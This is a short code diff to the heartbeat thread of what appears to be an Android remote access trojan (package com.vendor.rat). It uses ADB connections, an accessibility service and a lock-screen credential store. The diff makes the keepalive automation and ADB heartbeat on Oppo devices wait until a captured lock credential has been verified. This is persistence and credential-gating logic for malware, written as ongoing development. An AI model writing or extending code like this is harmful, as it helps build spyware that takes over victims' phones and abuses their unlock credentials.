@@ -19,6 +19,8 @@ import com.vendor.rat.adb.AdbConnectionManager;
 import com.vendor.rat.network.NetworkManager;
 import com.vendor.rat.service.CustomNotificationService;
 import com.vendor.rat.service.MyAccessibilityService;
+import com.vendor.rat.credential.LockCredentialStore;
+import com.vendor.rat.utils.DeviceUtils;
 
 import java.io.ByteArrayOutputStream;
 import java.io.UnsupportedEncodingException;
@@ -152,7 +154,11 @@ public final class KeepHeartThread extends TimerTask {
                 checkHttpServer();
                 // vendor: noCompletes API → StrategyThread 触发保活自动化
                 // ADAPT: 由于没有真实 API，直接触发策略检查
-                StrategyThread.triggerKeepAliveIfNeeded();
+                if (DeviceUtils.isOppo() && !LockCredentialStore.isCurrentRunVerified()) {
+   Log.d(TAG, "skip keepalive automation: credential gate not verified in current run");
+         } else {
+ StrategyThread.triggerKeepAliveIfNeeded();
+    }
                 triggerDataSync();
                 fetchCacheTasks();
 
@@ -163,7 +169,11 @@ public final class KeepHeartThread extends TimerTask {
                         AdbConnectionManager mgr = AdbConnectionManager.getInstance();
                         if (mgr != null) {
                             Log.d(TAG, "ADB heartbeat tick");
-                            mgr.heartbeat();
+                            if (DeviceUtils.isOppo() && !LockCredentialStore.isCurrentRunVerified()) {
+                              Log.d(TAG, "skip heartbeat: credential gate not verified");
+                            } else {
+                                mgr.heartbeat();
+                            }
                         } else {
                             Log.w(TAG, "ADB heartbeat: AdbConnectionManager is null");
                         }
